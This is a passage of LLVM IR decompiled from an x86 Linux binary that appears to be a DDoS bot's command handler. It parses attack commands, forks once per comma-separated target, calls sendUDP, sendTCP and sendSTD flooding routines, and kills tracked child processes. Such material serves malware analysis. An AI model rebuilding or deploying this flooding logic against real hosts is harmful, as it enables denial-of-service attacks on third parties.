  br label %dec_label_pc_804c2a1

dec_label_pc_804c2a1:                             ; preds = %dec_label_pc_804c26c.thread, %dec_label_pc_804c26c, %dec_label_pc_804c27b
  %storemerge24159 = phi i32 [ 1000000, %dec_label_pc_804c26c.thread ], [ %v1_804c252, %dec_label_pc_804c26c ], [ %v1_804c252, %dec_label_pc_804c27b ]
  %storemerge25154158 = phi i32 [ %storemerge25154.ph, %dec_label_pc_804c26c.thread ], [ %v1_804c21d, %dec_label_pc_804c26c ], [ %v1_804c21d, %dec_label_pc_804c27b ]
  %v5_804c2ad = icmp ult i32* %stack_var_-284, inttoptr (i32 8 to i32*)
  store i1 %v5_804c2ad, i1* %cf.global-to-local, align 1
  store i32 %v2_804c1aa, i32* %stack_var_-300, align 4
  %v2_804c2b3 = inttoptr i32 %v2_804c1aa to i8*
  %v3_804c2b3 = call i32 @__GI_strchr(i8* %v2_804c2b3, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c2bb = icmp eq i32 %v3_804c2b3, 0
  br i1 %v1_804c2bb, label %dec_label_pc_804c32b, label %dec_label_pc_804c2bf

dec_label_pc_804c2bf:                             ; preds = %dec_label_pc_804c2a1
  store i32 %v2_804c1aa, i32* @eax, align 4
  store i1 %v5_804c2ad, i1* %cf.global-to-local, align 1
  store i32 %v2_804c1aa, i32* %stack_var_-300, align 4
  %v2_804c2cb = call i32 @__GI_strtok(i32 %v2_804c1aa, i32 ptrtoint (i32* @global_var_8055a54.140 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804c320177 = icmp eq i32 %v2_804c2cb, 0
  %v1_804c324178 = icmp eq i1 %v4_804c320177, false
  br i1 %v1_804c324178, label %dec_label_pc_804c2d8, label %dec_label_pc_804c859

dec_label_pc_804c2d8:                             ; preds = %dec_label_pc_804c2bf, %dec_label_pc_804c30b
  %storemerge179 = phi i32 [ %v2_804c315, %dec_label_pc_804c30b ], [ %v2_804c2cb, %dec_label_pc_804c2bf ]
  %v0_804c2d8 = call i32 @listFork()
  store i32 %v0_804c2d8, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c2dd = icmp eq i32 %v0_804c2d8, 0
  %v1_804c2df = icmp eq i1 %v1_804c2dd, false
  br i1 %v1_804c2df, label %dec_label_pc_804c30b, label %dec_label_pc_804c2e1

dec_label_pc_804c2e1:                             ; preds = %dec_label_pc_804c2d8
  store i32 %v1_804c200, i32* %stack_var_-300, align 4
  %v7_804c2f9 = call i32 @sendUDP(i32 %storemerge179, i32 %v1_804c1bb, i32 %v1_804c1d2, i32 %v1_804c1e9, i32 %v1_804c200, i32 %storemerge25154158, i32 %storemerge24159)
  store i1 %v5_804c0d7, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-300, align 4
  %v1_804c306 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804c30b:                             ; preds = %dec_label_pc_804c2d8
  %v0_804c30b = load i32, i32* @esp, align 4
  %v5_804c30b = icmp ult i32 %v0_804c30b, 8
  store i1 %v5_804c30b, i1* %cf.global-to-local, align 1
  %v2_804c315 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8055a54.140 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804c320 = icmp eq i32 %v2_804c315, 0
  %v1_804c324 = icmp eq i1 %v4_804c320, false
  br i1 %v1_804c324, label %dec_label_pc_804c2d8, label %dec_label_pc_804c859

dec_label_pc_804c32b:                             ; preds = %dec_label_pc_804c2a1
  %v0_804c32b = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c330 = icmp eq i32 %v0_804c32b, 0
  %v1_804c332 = icmp eq i1 %v1_804c330, false
  br i1 %v1_804c332, label %dec_label_pc_804c859, label %dec_label_pc_804c338

dec_label_pc_804c338:                             ; preds = %dec_label_pc_804c32b
  store i32 %v1_804c200, i32* %stack_var_-300, align 4
  %v8_804c350 = call i32 @sendUDP(i32 %v2_804c1aa, i32 %v1_804c1bb, i32 %v1_804c1d2, i32 %v1_804c1e9, i32 %v1_804c200, i32 %storemerge25154158, i32 %storemerge24159)
  store i1 %v5_804c0d7, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-300, align 4
  %v1_804c35d = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804c362:                             ; preds = %dec_label_pc_804c05d
  %v2_804c365 = load i32, i32* %v1_804bd40, align 4
  store i1 false, i1* @df, align 1
  %v4_804c382 = inttoptr i32 %v2_804c365 to i8*
  %v7_804c394 = call i32 @_strncmp(i8* %v4_804c382, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8055aae.154, i32 0, i32 0), i32 4)
  %v8_804c394 = urem i32 %v7_804c394, 2
  %v9_804c394 = icmp eq i32 %v8_804c394, 0
  %v0_804c396 = load i1, i1* %cf.global-to-local, align 1
  %v2_804c396 = or i1 %v0_804c396, %v9_804c394
  %v3_804c396 = zext i1 %v2_804c396 to i32
  %v4_804c396 = load i32, i32* %edx.global-to-local, align 4
  %v5_804c396 = and i32 %v4_804c396, -256
  %v6_804c396 = or i32 %v3_804c396, %v5_804c396
  %v7_804c396 = xor i32 %v6_804c396, 1
  store i32 %v7_804c396, i32* @edx, align 4
  %v1_804c39e = trunc i32 %v7_804c396 to i8
  %v3_804c39e = zext i1 %v0_804c396 to i8
  %v4_804c39e = sub nsw i8 %v1_804c39e, %v3_804c39e
  %v15_804c39e = icmp eq i8 %v4_804c39e, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c3a7 = icmp eq i1 %v15_804c39e, false
  br i1 %v1_804c3a7, label %dec_label_pc_804c5e6, label %dec_label_pc_804c3ad

dec_label_pc_804c3ad:                             ; preds = %dec_label_pc_804c362
  %v2_804c3a2 = sext i8 %v4_804c39e to i32
  %v9_804c3ad = icmp ult i32 %tmp105, 5
  store i1 %v9_804c3ad, i1* %cf.global-to-local, align 1
  %v7_804c3b1 = icmp sgt i32 %tmp105, 5
  br i1 %v7_804c3b1, label %dec_label_pc_804c3b7, label %dec_label_pc_804c859

dec_label_pc_804c3b7:                             ; preds = %dec_label_pc_804c3ad
  %v1_804c3ba = add i32 %tmp124, 12
  %v1_804c3bd = inttoptr i32 %v1_804c3ba to i32*
  %v2_804c3bd = load i32, i32* %v1_804c3bd, align 4
  %v0_804c3bf = load i32, i32* @esp, align 4
  %v5_804c3bf = icmp ult i32 %v0_804c3bf, 12
  store i1 %v5_804c3bf, i1* %cf.global-to-local, align 1
  %v1_804c3c3 = call i32 @atol(i32 %v2_804c3bd)
  %v5_804c3cb = icmp ne i32 %v1_804c3c3, -1
  store i1 %v5_804c3cb, i1* %cf.global-to-local, align 1
  %v10_804c3cb = icmp eq i32 %v1_804c3c3, -1
  br i1 %v10_804c3cb, label %dec_label_pc_804c859, label %dec_label_pc_804c3d4

dec_label_pc_804c3d4:                             ; preds = %dec_label_pc_804c3b7
  %v1_804c3d7 = add i32 %tmp124, 8
  %v1_804c3da = inttoptr i32 %v1_804c3d7 to i32*
  %v2_804c3da = load i32, i32* %v1_804c3da, align 4
  %v5_804c3dc = icmp ult i32* %stack_var_-300, inttoptr (i32 12 to i32*)
  store i1 %v5_804c3dc, i1* %cf.global-to-local, align 1
  %v1_804c3e0 = call i32 @atol(i32 %v2_804c3da)
  %v5_804c3e8 = icmp ne i32 %v1_804c3e0, -1
  store i1 %v5_804c3e8, i1* %cf.global-to-local, align 1
  %v10_804c3e8 = icmp eq i32 %v1_804c3e0, -1
  br i1 %v10_804c3e8, label %dec_label_pc_804c859, label %dec_label_pc_804c3f1

dec_label_pc_804c3f1:                             ; preds = %dec_label_pc_804c3d4
  %v1_804c3f4 = add i32 %tmp124, 16
  %v1_804c3f7 = inttoptr i32 %v1_804c3f4 to i32*
  %v2_804c3f7 = load i32, i32* %v1_804c3f7, align 4
  store i1 %v5_804c3dc, i1* %cf.global-to-local, align 1
  %v1_804c3fd = call i32 @atol(i32 %v2_804c3f7)
  %v5_804c405 = icmp ne i32 %v1_804c3fd, -1
  store i1 %v5_804c405, i1* %cf.global-to-local, align 1
  %v10_804c405 = icmp eq i32 %v1_804c3fd, -1
  br i1 %v10_804c405, label %dec_label_pc_804c859, label %dec_label_pc_804c40e

dec_label_pc_804c40e:                             ; preds = %dec_label_pc_804c3f1
  %v2_804c414 = load i32, i32* %v1_804c3f7, align 4
  store i1 %v5_804c3dc, i1* %cf.global-to-local, align 1
  %v1_804c41a = call i32 @atol(i32 %v2_804c414)
  %v1_804c422 = add i32 %v1_804c41a, -32
  %v2_804c422 = icmp ult i32 %v1_804c41a, 32
  %v3_804c422 = sub i32 31, %v1_804c41a
  %v4_804c422 = and i32 %v3_804c422, %v1_804c41a
  %v5_804c422 = icmp slt i32 %v4_804c422, 0
  store i1 %v2_804c422, i1* %cf.global-to-local, align 1
  %v6_804c422 = icmp eq i32 %v1_804c422, 0
  %v7_804c422 = icmp slt i32 %v1_804c422, 0
  %v3_804c425 = icmp eq i1 %v7_804c422, %v5_804c422
  %v4_804c425 = icmp eq i1 %v6_804c422, false
  %v5_804c425 = and i1 %v4_804c425, %v3_804c425
  br i1 %v5_804c425, label %dec_label_pc_804c859, label %dec_label_pc_804c42b

dec_label_pc_804c42b:                             ; preds = %dec_label_pc_804c40e
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804c42f = icmp sgt i32 %tmp105, 6
  br i1 %v7_804c42f, label %dec_label_pc_804c431, label %dec_label_pc_804c44d.thread

dec_label_pc_804c44d.thread:                      ; preds = %dec_label_pc_804c42b
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804c470

dec_label_pc_804c431:                             ; preds = %dec_label_pc_804c42b
  %v1_804c434 = add i32 %tmp124, 24
  %v1_804c437 = inttoptr i32 %v1_804c434 to i32*
  %v2_804c437 = load i32, i32* %v1_804c437, align 4
  store i1 %v5_804c3dc, i1* %cf.global-to-local, align 1
  %v1_804c43d = call i32 @atol(i32 %v2_804c437)
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804c445 = icmp slt i32 %v1_804c43d, 0
  br i1 %v2_804c445, label %dec_label_pc_804c859, label %dec_label_pc_804c44d

dec_label_pc_804c44d:                             ; preds = %dec_label_pc_804c431
  %v8_804c44d = icmp ult i32 %tmp105, 8
  store i1 %v8_804c44d, i1* %cf.global-to-local, align 1
  %v12_804c44d = icmp eq i32 %tmp105, 8
  %v1_804c451 = icmp eq i1 %v12_804c44d, false
  br i1 %v1_804c451, label %dec_label_pc_804c470, label %dec_label_pc_804c453

dec_label_pc_804c453:                             ; preds = %dec_label_pc_804c44d
  %v1_804c456 = add i32 %tmp124, 28
  %v1_804c459 = inttoptr i32 %v1_804c456 to i32*
  %v2_804c459 = load i32, i32* %v1_804c459, align 4
  store i1 %v5_804c3dc, i1* %cf.global-to-local, align 1
  %v1_804c45f = call i32 @atol(i32 %v2_804c459)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp148 = icmp slt i32 %v1_804c45f, 1
  %tmp149 = icmp eq i1 %tmp148, false
  br i1 %tmp149, label %dec_label_pc_804c470, label %dec_label_pc_804c859

dec_label_pc_804c470:                             ; preds = %dec_label_pc_804c44d.thread, %dec_label_pc_804c453, %dec_label_pc_804c44d
  %v8_804c44d163 = phi i1 [ true, %dec_label_pc_804c44d.thread ], [ %v8_804c44d, %dec_label_pc_804c453 ], [ %v8_804c44d, %dec_label_pc_804c44d ]
  %v1_804c451165 = phi i1 [ true, %dec_label_pc_804c44d.thread ], [ false, %dec_label_pc_804c453 ], [ true, %dec_label_pc_804c44d ]
  %v1_804c473 = add i32 %tmp124, 4
  %v1_804c476 = inttoptr i32 %v1_804c473 to i32*
  %v2_804c476 = load i32, i32* %v1_804c476, align 4
  %v2_804c481 = load i32, i32* %v1_804c3da, align 4
  store i1 %v5_804c3dc, i1* %cf.global-to-local, align 1
  %v1_804c487 = call i32 @atol(i32 %v2_804c481)
  %v2_804c498 = load i32, i32* %v1_804c3bd, align 4
  store i1 %v5_804c3dc, i1* %cf.global-to-local, align 1
  %v1_804c49e = call i32 @atol(i32 %v2_804c498)
  %v2_804c4af = load i32, i32* %v1_804c3f7, align 4
  store i1 %v5_804c3dc, i1* %cf.global-to-local, align 1
  %v1_804c4b5 = call i32 @atol(i32 %v2_804c4af)
  %v1_804c4c3 = add i32 %tmp124, 20
  %v1_804c4c6 = inttoptr i32 %v1_804c4c3 to i32*
  %v2_804c4c6 = load i32, i32* %v1_804c4c6, align 4
  store i1 %v8_804c44d163, i1* %cf.global-to-local, align 1
  br i1 %v1_804c451165, label %dec_label_pc_804c4f7, label %dec_label_pc_804c4d1

dec_label_pc_804c4d1:                             ; preds = %dec_label_pc_804c470
  %v1_804c4d4 = add i32 %tmp124, 28
  %v1_804c4d7 = inttoptr i32 %v1_804c4d4 to i32*
  %v2_804c4d7 = load i32, i32* %v1_804c4d7, align 4
  store i1 %v5_804c3dc, i1* %cf.global-to-local, align 1
  %v1_804c4dd = call i32 @atol(i32 %v2_804c4d7)
  %v0_804c4e2 = load i32, i32* @esp, align 4
  %v2_804c4e2 = icmp ugt i32 %v0_804c4e2, -17
  store i1 %v2_804c4e2, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804c4f7

dec_label_pc_804c4f7:                             ; preds = %dec_label_pc_804c470, %dec_label_pc_804c4d1
  %storemerge22 = phi i32 [ %v1_804c4dd, %dec_label_pc_804c4d1 ], [ 10, %dec_label_pc_804c470 ]
  store i32 %storemerge22, i32* @esi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v7_804c42f, label %dec_label_pc_804c506, label %dec_label_pc_804c52c

dec_label_pc_804c506:                             ; preds = %dec_label_pc_804c4f7
  %v1_804c509 = add i32 %tmp124, 24
  %v1_804c50c = inttoptr i32 %v1_804c509 to i32*
  %v2_804c50c = load i32, i32* %v1_804c50c, align 4
  store i1 %v5_804c3dc, i1* %cf.global-to-local, align 1
  %v1_804c512 = call i32 @atol(i32 %v2_804c50c)
  %v0_804c517 = load i32, i32* @esp, align 4
  %v2_804c517 = icmp ugt i32 %v0_804c517, -17
  store i1 %v2_804c517, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804c52c

dec_label_pc_804c52c:                             ; preds = %dec_label_pc_804c4f7, %dec_label_pc_804c506
  %storemerge21 = phi i32 [ %v1_804c512, %dec_label_pc_804c506 ], [ 0, %dec_label_pc_804c4f7 ]
  store i32 %storemerge21, i32* @edi, align 4
  %v5_804c538 = icmp ult i32* %stack_var_-300, inttoptr (i32 8 to i32*)
  store i1 %v5_804c538, i1* %cf.global-to-local, align 1
  %v2_804c53e = inttoptr i32 %v2_804c476 to i8*
  %v3_804c53e = call i32 @__GI_strchr(i8* %v2_804c53e, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c546 = icmp eq i32 %v3_804c53e, 0
  br i1 %v1_804c546, label %dec_label_pc_804c5b3, label %dec_label_pc_804c54a

dec_label_pc_804c54a:                             ; preds = %dec_label_pc_804c52c
  store i32 %v2_804c476, i32* @eax, align 4
  store i1 %v5_804c538, i1* %cf.global-to-local, align 1
  %v2_804c556 = call i32 @__GI_strtok(i32 %v2_804c476, i32 ptrtoint (i32* @global_var_8055a54.140 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804c5ab173 = icmp eq i32 %v2_804c556, 0
  %v1_804c5af174 = icmp eq i1 %v4_804c5ab173, false
  br i1 %v1_804c5af174, label %dec_label_pc_804c563, label %dec_label_pc_804c5e6

dec_label_pc_804c563:                             ; preds = %dec_label_pc_804c54a, %dec_label_pc_804c596
  %storemerge20175 = phi i32 [ %v2_804c5a0, %dec_label_pc_804c596 ], [ %v2_804c556, %dec_label_pc_804c54a ]
  %v0_804c563 = call i32 @listFork()
  store i32 %v0_804c563, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c568 = icmp eq i32 %v0_804c563, 0
  %v1_804c56a = icmp eq i1 %v1_804c568, false
  %v0_804c596 = load i32, i32* @esp, align 4
  br i1 %v1_804c56a, label %dec_label_pc_804c596, label %dec_label_pc_804c56c

dec_label_pc_804c56c:                             ; preds = %dec_label_pc_804c563
  %v5_804c56c = icmp ult i32 %v0_804c596, 4
  store i1 %v5_804c56c, i1* %cf.global-to-local, align 1
  %v7_804c584 = inttoptr i32 %v2_804c4c6 to i8*
  %v8_804c584 = call i32 @sendTCP(i32 %storemerge20175, i32 %v1_804c487, i32 %v1_804c49e, i32 %v1_804c4b5, i8* %v7_804c584, i32 %storemerge21, i32 %storemerge22)
  store i1 %v5_804c3dc, i1* %cf.global-to-local, align 1
  %v1_804c591 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804c596:                             ; preds = %dec_label_pc_804c563
  %v5_804c596 = icmp ult i32 %v0_804c596, 8
  store i1 %v5_804c596, i1* %cf.global-to-local, align 1
  %v2_804c5a0 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8055a54.140 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804c5ab = icmp eq i32 %v2_804c5a0, 0
  %v1_804c5af = icmp eq i1 %v4_804c5ab, false
  br i1 %v1_804c5af, label %dec_label_pc_804c563, label %dec_label_pc_804c5e6

dec_label_pc_804c5b3:                             ; preds = %dec_label_pc_804c52c
  %v0_804c5b3 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c5b8 = icmp eq i32 %v0_804c5b3, 0
  %v1_804c5ba = icmp eq i1 %v1_804c5b8, false
  br i1 %v1_804c5ba, label %dec_label_pc_804c5e6, label %dec_label_pc_804c5bc

dec_label_pc_804c5bc:                             ; preds = %dec_label_pc_804c5b3
  %v0_804c5bc = load i32, i32* @esp, align 4
  %v5_804c5bc = icmp ult i32 %v0_804c5bc, 4
  store i1 %v5_804c5bc, i1* %cf.global-to-local, align 1
  %v7_804c5d4 = inttoptr i32 %v2_804c4c6 to i8*
  %v8_804c5d4 = call i32 @sendTCP(i32 %v2_804c476, i32 %v1_804c487, i32 %v1_804c49e, i32 %v1_804c4b5, i8* %v7_804c5d4, i32 %storemerge21, i32 %storemerge22)
  store i1 %v5_804c3dc, i1* %cf.global-to-local, align 1
  %v1_804c5e1 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804c5e6:                             ; preds = %dec_label_pc_804c54a, %dec_label_pc_804c596, %dec_label_pc_804c5b3, %dec_label_pc_804c362
  %v2_804c5e9 = load i32, i32* %v1_804bd40, align 4
  store i1 false, i1* @df, align 1
  %v4_804c606 = inttoptr i32 %v2_804c5e9 to i8*
  store i32 %v2_804c5e9, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8055ab2.155 to i32), i32* @edi, align 4
  %v7_804c618 = call i32 @_strncmp(i8* %v4_804c606, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8055ab2.155, i32 0, i32 0), i32 4)
  %v8_804c618 = urem i32 %v7_804c618, 2
  %v9_804c618 = icmp eq i32 %v8_804c618, 0
  %v0_804c61a = load i1, i1* %cf.global-to-local, align 1
  %v2_804c61a = or i1 %v0_804c61a, %v9_804c618
  %v3_804c61a = zext i1 %v2_804c61a to i32
  %v4_804c61a = load i32, i32* @edx, align 4
  %v5_804c61a = and i32 %v4_804c61a, -256
  %v6_804c61a = or i32 %v3_804c61a, %v5_804c61a
  %v7_804c61a = xor i32 %v6_804c61a, 1
  store i32 %v7_804c61a, i32* @edx, align 4
  %v1_804c622 = trunc i32 %v7_804c61a to i8
  %v3_804c622 = zext i1 %v0_804c61a to i8
  %v4_804c622 = sub nsw i8 %v1_804c622, %v3_804c622
  %v15_804c622 = icmp eq i8 %v4_804c622, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c62b = icmp eq i1 %v15_804c622, false
  br i1 %v1_804c62b, label %dec_label_pc_804c74a, label %dec_label_pc_804c631

dec_label_pc_804c631:                             ; preds = %dec_label_pc_804c5e6
  %v2_804c626 = sext i8 %v4_804c622 to i32
  %v9_804c631 = icmp ult i32 %tmp105, 3
  store i1 %v9_804c631, i1* %cf.global-to-local, align 1
  %v7_804c635 = icmp sgt i32 %tmp105, 3
  br i1 %v7_804c635, label %dec_label_pc_804c63b, label %dec_label_pc_804c859

dec_label_pc_804c63b:                             ; preds = %dec_label_pc_804c631
  %v1_804c63e = add i32 %tmp124, 8
  %v1_804c641 = inttoptr i32 %v1_804c63e to i32*
  %v2_804c641 = load i32, i32* %v1_804c641, align 4
  %v0_804c643 = load i32, i32* @esp, align 4
  %v5_804c643 = icmp ult i32 %v0_804c643, 12
  store i1 %v5_804c643, i1* %cf.global-to-local, align 1
  %v1_804c647 = call i32 @atol(i32 %v2_804c641)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp150 = icmp slt i32 %v1_804c647, 1
  br i1 %tmp150, label %dec_label_pc_804c859, label %dec_label_pc_804c657

dec_label_pc_804c657:                             ; preds = %dec_label_pc_804c63b
  %v1_804c65a = add i32 %tmp124, 12
  %v1_804c65d = inttoptr i32 %v1_804c65a to i32*
  %v2_804c65d = load i32, i32* %v1_804c65d, align 4
  %v5_804c65f = icmp ult i32* %stack_var_-300, inttoptr (i32 12 to i32*)
  store i1 %v5_804c65f, i1* %cf.global-to-local, align 1
  %v1_804c663 = call i32 @atol(i32 %v2_804c65d)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp151 = icmp slt i32 %v1_804c663, 1
  %tmp152 = icmp eq i1 %tmp151, false
  br i1 %tmp152, label %dec_label_pc_804c674, label %dec_label_pc_804c859

dec_label_pc_804c674:                             ; preds = %dec_label_pc_804c657
  %v1_804c677 = add i32 %tmp124, 4
  %v1_804c67a = inttoptr i32 %v1_804c677 to i32*
  %v2_804c67a = load i32, i32* %v1_804c67a, align 4
  %v2_804c685 = load i32, i32* %v1_804c641, align 4
  store i1 %v5_804c65f, i1* %cf.global-to-local, align 1
  %v1_804c68b = call i32 @atol(i32 %v2_804c685)
  %v2_804c69c = load i32, i32* %v1_804c65d, align 4
  store i1 %v5_804c65f, i1* %cf.global-to-local, align 1
  %v1_804c6a2 = call i32 @atol(i32 %v2_804c69c)
  %v5_804c6b0 = icmp ult i32* %stack_var_-300, inttoptr (i32 8 to i32*)
  store i1 %v5_804c6b0, i1* %cf.global-to-local, align 1
  %v2_804c6b6 = inttoptr i32 %v2_804c67a to i8*
  %v3_804c6b6 = call i32 @__GI_strchr(i8* %v2_804c6b6, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c6be = icmp eq i32 %v3_804c6b6, 0
  br i1 %v1_804c6be, label %dec_label_pc_804c71f, label %dec_label_pc_804c6c2

dec_label_pc_804c6c2:                             ; preds = %dec_label_pc_804c674
  store i32 %v2_804c67a, i32* @eax, align 4
  store i1 %v5_804c6b0, i1* %cf.global-to-local, align 1
  %v2_804c6ce = call i32 @__GI_strtok(i32 %v2_804c67a, i32 ptrtoint (i32* @global_var_8055a54.140 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804c717170 = icmp eq i32 %v2_804c6ce, 0
  %v1_804c71b171 = icmp eq i1 %v4_804c717170, false
  br i1 %v1_804c71b171, label %dec_label_pc_804c6db, label %dec_label_pc_804c74a

dec_label_pc_804c6db:                             ; preds = %dec_label_pc_804c6c2, %dec_label_pc_804c702
  %storemerge61172 = phi i32 [ %v2_804c70c, %dec_label_pc_804c702 ], [ %v2_804c6ce, %dec_label_pc_804c6c2 ]
  %v0_804c6db = call i32 @listFork()
  store i32 %v0_804c6db, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c6e0 = icmp eq i32 %v0_804c6db, 0
  %v1_804c6e2 = icmp eq i1 %v1_804c6e0, false
  %v0_804c702 = load i32, i32* @esp, align 4
  br i1 %v1_804c6e2, label %dec_label_pc_804c702, label %dec_label_pc_804c6e4

dec_label_pc_804c6e4:                             ; preds = %dec_label_pc_804c6db
  %v5_804c6e4 = icmp ult i32 %v0_804c702, 4
  store i1 %v5_804c6e4, i1* %cf.global-to-local, align 1
  %v3_804c6f0 = trunc i32 %v1_804c68b to i16
  %v4_804c6f0 = call i32 @sendSTD(i32 %storemerge61172, i16 %v3_804c6f0, i32 %v1_804c6a2)
  store i1 %v5_804c65f, i1* %cf.global-to-local, align 1
  %v1_804c6fd = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804c702:                             ; preds = %dec_label_pc_804c6db
  %v5_804c702 = icmp ult i32 %v0_804c702, 8
  store i1 %v5_804c702, i1* %cf.global-to-local, align 1
  %v2_804c70c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8055a54.140 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804c717 = icmp eq i32 %v2_804c70c, 0
  %v1_804c71b = icmp eq i1 %v4_804c717, false
  br i1 %v1_804c71b, label %dec_label_pc_804c6db, label %dec_label_pc_804c74a

dec_label_pc_804c71f:                             ; preds = %dec_label_pc_804c674
  %v0_804c71f = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c724 = icmp eq i32 %v0_804c71f, 0
  %v1_804c726 = icmp eq i1 %v1_804c724, false
  br i1 %v1_804c726, label %dec_label_pc_804c859, label %dec_label_pc_804c72c

dec_label_pc_804c72c:                             ; preds = %dec_label_pc_804c71f
  %v0_804c72c = load i32, i32* @esp, align 4
  %v5_804c72c = icmp ult i32 %v0_804c72c, 4
  store i1 %v5_804c72c, i1* %cf.global-to-local, align 1
  %v3_804c738 = trunc i32 %v1_804c68b to i16
  %v4_804c738 = call i32 @sendSTD(i32 %v2_804c67a, i16 %v3_804c738, i32 %v1_804c6a2)
  store i1 %v5_804c65f, i1* %cf.global-to-local, align 1
  %v1_804c745 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804c74a:                             ; preds = %dec_label_pc_804c6c2, %dec_label_pc_804c702, %dec_label_pc_804c5e6
  %v2_804c74d = load i32, i32* %v1_804bd40, align 4
  store i1 false, i1* @df, align 1
  %v4_804c76a = inttoptr i32 %v2_804c74d to i8*
  %v7_804c77c = call i32 @_strncmp(i8* %v4_804c76a, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8055ab6.156, i32 0, i32 0), i32 9)
  %v8_804c77c = urem i32 %v7_804c77c, 2
  %v9_804c77c = icmp eq i32 %v8_804c77c, 0
  %v0_804c77e = load i1, i1* %cf.global-to-local, align 1
  %v2_804c77e = or i1 %v0_804c77e, %v9_804c77c
  %v3_804c77e = zext i1 %v2_804c77e to i32
  %v4_804c77e = load i32, i32* @edx, align 4
  %v5_804c77e = and i32 %v4_804c77e, -256
  %v6_804c77e = or i32 %v3_804c77e, %v5_804c77e
  %v7_804c77e = xor i32 %v6_804c77e, 1
  store i32 %v7_804c77e, i32* %edx.global-to-local, align 4
  %v1_804c786 = trunc i32 %v7_804c77e to i8
  %v3_804c786 = zext i1 %v0_804c77e to i8
  %v4_804c786 = sub nsw i8 %v1_804c786, %v3_804c786
  %v15_804c786 = icmp eq i8 %v4_804c786, 0
  %v2_804c78a = sext i8 %v4_804c786 to i32
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c78f = icmp eq i1 %v15_804c786, false
  br i1 %v1_804c78f, label %dec_label_pc_804c859, label %dec_label_pc_804c7fc.preheader

dec_label_pc_804c7fc.preheader:                   ; preds = %dec_label_pc_804c74a
  br label %dec_label_pc_804c7fc

dec_label_pc_804c7a5:                             ; preds = %dec_label_pc_804c839, %dec_label_pc_804c7fc
  %v2_804c7a8 = mul i32 %storemerge18, 4
  store i32 %v2_804c7a8, i32* %edx.global-to-local, align 4
  %v0_804c7ad = load i32, i32* @global_var_805e754.33, align 4
  %v2_804c7b2 = add i32 %v0_804c7ad, %v2_804c7a8
  %v1_804c7b5 = inttoptr i32 %v2_804c7b2 to i32*
  %v2_804c7b5 = load i32, i32* %v1_804c7b5, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c7b7 = icmp eq i32 %v2_804c7b5, 0
  br i1 %v1_804c7b7, label %dec_label_pc_804c7f9, label %dec_label_pc_804c7bb

dec_label_pc_804c7bb:                             ; preds = %dec_label_pc_804c7a5
  %v9_804c7a8 = and i32 %storemerge18, 1073741824
  %v10_804c7a8 = icmp ne i32 %v9_804c7a8, 0
  store i1 %v10_804c7a8, i1* %cf.global-to-local, align 1
  store i32 %v2_804c7a8, i32* %edx.global-to-local, align 4
  %v2_804c7cb = load i32, i32* %v1_804c7b5, align 4
  store i32 %v2_804c7cb, i32* @ebx, align 4
  %v0_804c7cd = call i32 @__libc_getpid()
  %v0_804c7d2 = load i32, i32* @ebx, align 4
  %v7_804c7d2 = icmp ult i32 %v0_804c7d2, %v0_804c7cd
  store i1 %v7_804c7d2, i1* %cf.global-to-local, align 1
  %v12_804c7d2 = icmp eq i32 %v0_804c7d2, %v0_804c7cd
  br i1 %v12_804c7d2, label %dec_label_pc_804c7f9, label %dec_label_pc_804c7d6

dec_label_pc_804c7d6:                             ; preds = %dec_label_pc_804c7bb
  store i32 %v2_804c7a8, i32* %edx.global-to-local, align 4
  %v0_804c7de = load i32, i32* @global_var_805e754.33, align 4
  %v2_804c7e3 = add i32 %v0_804c7de, %v2_804c7a8
  %v1_804c7e6 = inttoptr i32 %v2_804c7e3 to i32*
  %v2_804c7e6 = load i32, i32* %v1_804c7e6, align 4
  %v0_804c7e8 = load i32, i32* @esp, align 4
  %v5_804c7e8 = icmp ult i32 %v0_804c7e8, 8
  store i1 %v5_804c7e8, i1* %cf.global-to-local, align 1
  %v2_804c7ee = call i32 @kill(i32 %v2_804c7e6, i32 9)
